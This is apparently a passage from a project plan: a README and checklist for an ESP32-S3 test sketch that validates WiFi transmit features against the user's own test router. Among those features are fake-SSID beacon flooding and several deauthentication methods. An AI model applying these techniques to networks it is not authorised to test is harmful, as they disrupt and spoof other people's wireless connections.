Isolated test sketch to validate ESP32-S3 WiFi TX capabilities before
Phase 3 implementation.

## Setup

1. Open a terminal in this `spike/` directory
2. Edit `TARGET_BSSID` and `TARGET_CHANNEL` in `src/main.cpp` to match
   your test router (needed for test 3 — deauth)
3. Flash: `pio run -t upload`
4. Open serial monitor: `pio device monitor`

## Tests

| Key | Test | What It Does |
|-----|------|--------------|
| 1 | Beacon TX | Sends 20 fake SSIDs — check phone WiFi list |
| 2 | TX+RX Coexistence | Beacon TX while counting promiscuous RX callbacks |
| 3 | Deauth Methods | Tests direct injection, rogue AP, and WSL patch |
| 4 | Memory Stability | 1000 TX frames × 3 rounds, measures heap drift |
| 5 | Run All | Chains 1→4, prints summary table |
| R | Results | Reprints the summary table |

## After Validation

Record the results table output. These findings determine Phase 3
architecture decisions (see decision matrix in the design spec).

Delete this entire `spike/` folder once Phase 3 implementation begins.
```

- [ ] **Step 2: Full run — type `5` (Run All)**

Flash and open serial monitor. Type `5`. Observe all four tests run sequentially.
At the end, the summary table prints with PASS/FAIL/N/A for each.

Copy the results table output — this is the primary deliverable of the spike.

- [ ] **Step 3: Commit**

```bash
git add spike/README.md
git commit -m "spike: add README, validation suite complete"
```
